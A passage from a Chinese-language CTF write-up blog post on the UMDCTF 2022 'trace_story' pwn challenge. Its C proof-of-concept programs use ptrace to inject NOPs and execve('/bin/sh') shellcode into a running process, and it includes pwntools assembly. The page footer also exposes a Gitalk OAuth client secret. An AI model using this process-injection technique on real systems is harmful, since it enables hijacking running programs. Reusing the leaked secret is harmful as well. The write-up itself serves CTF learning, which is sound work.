class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = <span class="number">0x401802</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr_exit = <span class="number">0x401827</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> txt = <span class="number">0x402011</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [pid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait(NULL);</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rip: %llx\n&quot;</span>,regs.rip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//puts after read patch</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr,    <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">8</span>,  <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">16</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">24</span>, <span class="number">0xf789489090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//patchout exit</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">0</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">2</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//readstory.txt is now flag</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的addr+24位置的内容为我们自己添加的<code>mov rdi,rsi</code>可以用以下代码输出其对应的汇编代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = asm(<span class="string">&quot;mov rdi,rsi&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 下面为输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">➜  trace_story python3 testasm.py</span></span><br><span class="line"><span class="string">b&#x27;H\x89\xf7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到确实拿到了flag。</p>
+<p><img src="/.io//image-20220307222728045.png" alt="image-20220307222728045"></p>
+<h2 id="ptrace利用2——poc-system"><a href="#ptrace利用2——poc-system" class="headerlink" title="ptrace利用2——poc(system)"></a>ptrace利用2——poc(system)</h2><p>有了上面的基础，我们可以大胆想象：既然都能随便修改指令了，我们直接系统调用execve(/bin/sh)不就行了吗？事实证明这样也是可以的。看到程序的如下部分: 注意0x4017aa位置将一个字符串变量放进rdi中，可以利用这个，将对应字符串修改为/bin/sh之后触发系统调用。下面我们试试写poc。</p>
+<p>我们需要从0x40179f开始写。以下为原始内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040179D                 test    eax, eax</span><br><span class="line">.text:000000000040179F                 jnz     loc_40183E</span><br><span class="line">.text:00000000004017A5                 mov     esi, 0          ; oflag</span><br><span class="line">.text:00000000004017AA                 mov     edi, offset file ; &quot;readstory.txt&quot;</span><br><span class="line">.text:00000000004017AF                 mov     eax, 0</span><br><span class="line">.text:00000000004017B4                 call    _open</span><br><span class="line">;.text:00000000004017B9                 mov     [rbp+fd], eax</span><br></pre></td></tr></table></figure>
+
+<p>我们打算修改成如下内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040179D                 nop</span><br><span class="line">.text:000000000040179e                 mov     rdx, 0</span><br><span class="line">.text:00000000004017A5                 mov     esi, 0          ; oflag</span><br><span class="line">.text:00000000004017AA                 mov     edi, offset file ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004017AF                 mov     eax, 0x3b ;execve的系统调用号</span><br><span class="line">.text:00000000004017B4                 syscall</span><br><span class="line">.text:00000000004017B6                 jmp $			; 否则子进程就退出了</span><br><span class="line">.text:00000000004017B8                 nop</span><br><span class="line">;.text:00000000004017B9                 mov     [rbp+fd], eax&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>其中，字节码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># nop</span><br><span class="line">&#x27;\x90&#x27;</span><br><span class="line"># mov rdx,0</span><br><span class="line">&#x27;\x48\xc7\xc2\x00\x00\x00\x00&#x27;</span><br><span class="line"># mov esi,0</span><br><span class="line">\xbe\x00\x00\x00\x00</span><br><span class="line"># mov edi,binsh</span><br><span class="line">\xbf\x11\x20\x40\x00</span><br><span class="line"># mov eax,0x3b</span><br><span class="line">’\xb8\x3b\x00\x00\x00&#x27;</span><br><span class="line"># syscall</span><br><span class="line">&#x27;\x0f\x05&#x27;</span><br><span class="line"># jmp $</span><br><span class="line">\xeb\xfe</span><br><span class="line"># nop</span><br><span class="line">\x90\x90\x90</span><br></pre></td></tr></table></figure>
+
+<p>后来我才想到，它开沙箱了。。顿时心里暖暖的。。。写了一个poc如下，能出hint说明写的应该是没毛病，就是因为开了沙箱，没法syscall。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr = <span class="number">0x40179d</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr_exit = <span class="number">0x401827</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> txt = <span class="number">0x402011</span>; <span class="comment">// readstory.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s [pid]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait(NULL);</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rip: %llx\n&quot;</span>,regs.rip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//puts after read patch</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr,    <span class="number">0x00000000c2c74890</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">8</span>,  <span class="number">0x2011bf00000000be</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">16</span>, <span class="number">0x0f0000003bb80040</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr+<span class="number">24</span>, <span class="number">0x9090909090feeb05</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//patchout exit</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">0</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, addr_exit+<span class="number">2</span>, <span class="number">0x9090909090909090</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//readstory.txt is now /bin/sh</span></span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt, <span class="number">0x68732f6e69622f</span>);</span><br><span class="line">    ptrace(PTRACE_POKETEXT, pid, txt+<span class="number">8</span>, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>有了上面poc的支撑，我们就只需要把poc转换成汇编代码即可。这里采取的是orw方法获取flag。其实有了poc剩下的就是转换成汇编即可。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2022/trace_story/exploit.py">https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2022/trace_story/exploit.py</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-03-07, 14:04:05</p>
+        <p><span>最后更新:</span>2022-03-09, 14:39:28</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/03/07/umdctf2022-pwn/" title="umdctf2022-pwn">https://nicholas-wei.github.io/2022/03/07/umdctf2022-pwn/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/03/07/umdctf2022-pwn/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/03/09/fuzzing-1-gegeral-knowledge/">
+                    fuzzing-1-gegeral_knowledge
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/03/06/kernel-6-HijackPrctl/">
+                    kernel-6-HijackPrctl
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#the-show"><span class="toc-number">1.</span> <span class="toc-text">the show</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#trace"><span class="toc-number">2.</span> <span class="toc-text">trace</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.1.</span> <span class="toc-text">ptrace是什么?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace%E5%88%A9%E7%94%A81%E2%80%94%E2%80%94poc-orw"><span class="toc-number">2.2.</span> <span class="toc-text">ptrace利用1——poc(orw)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace%E5%88%A9%E7%94%A82%E2%80%94%E2%80%94poc-system"><span class="toc-number">2.3.</span> <span class="toc-text">ptrace利用2——poc(system)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"umdctf2022-pwn　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/03/09/fuzzing-1-gegeral-knowledge/" title="上一篇: fuzzing-1-gegeral_knowledge">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/03/06/kernel-6-HijackPrctl/" title="下一篇: kernel-6-HijackPrctl">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
